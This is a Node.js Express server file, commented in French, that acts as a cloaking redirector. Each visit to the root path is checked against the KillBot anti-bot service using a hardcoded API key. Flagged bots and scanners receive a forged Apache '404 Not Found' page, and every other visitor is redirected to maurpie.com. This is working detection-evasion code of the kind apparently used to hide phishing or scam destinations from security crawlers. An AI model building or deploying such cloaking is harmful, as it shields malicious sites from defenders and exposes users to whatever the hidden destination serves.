// index.js

const express = require('express');
const KillBot = require('killbot.to');

const app = express();
const PORT = process.env.PORT || 3000;

// Clé et config KillBot
const apiKey = '225e7b97-524c-45d6-800c-aa7e3831a1ab';
const config = 'default';
const killBot = new KillBot(apiKey, config);

// Page HTML si “bloqué”
const fake404 = `
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head><title>404 Not Found</title></head>
<body>
  <h1>Not Found</h1>
  <p>The requested URL was not found on this server.</p>
  <hr>
  <address>Apache/2.4.57 (Debian) Server Port 80</address>
</body></html>
`;

// Détecter IP “locale” ou “invalide”
function isLocalIp(ip) {
  if (!ip) return true;
  // On exclut 127.x, 10.x, 192.168.x, ::1, ...
  return (
    ip.startsWith('127.') ||
    ip.startsWith('10.') ||
    ip.startsWith('192.168.') ||
    ip.startsWith('::1') ||
    ip === '0.0.0.0'
  );
}

app.get('/', (req, res) => {
  // Récupérer l'IP depuis X-Forwarded-For (Render) ou fallback
  let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  // On peut n’afficher qu’une IP si x-forwarded-for en contient plusieurs
  if (ip.includes(',')) {
    ip = ip.split(',')[0].trim();
  }

  // Si l'IP est locale → on skip KillBot, on redirige direct
  if (isLocalIp(ip)) {
    console.log('KillBot: IP locale => on ignore, redirection...');
    return res.redirect('https://maurpie.com');
  }

  // Sinon, on appelle killBot.checkReq(req) ou killBot.check({ ip, ua })
  killBot.checkReq(req)
    .then(result => {
      if (result.block) {
        // Bloqué → faux 404
        return res.status(404).send(fake404);
      } else {
        // Accepté → redirige vers site
        return res.redirect('https://maurpie.com');
      }
    })
    .catch(err => {
      // En cas d’erreur KillBot (Invalid IP address, etc.)
      console.error('KillBot error:', err);
      // On redirige tout de même
      return res.redirect('https://maurpie.com');
    });
});

app.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});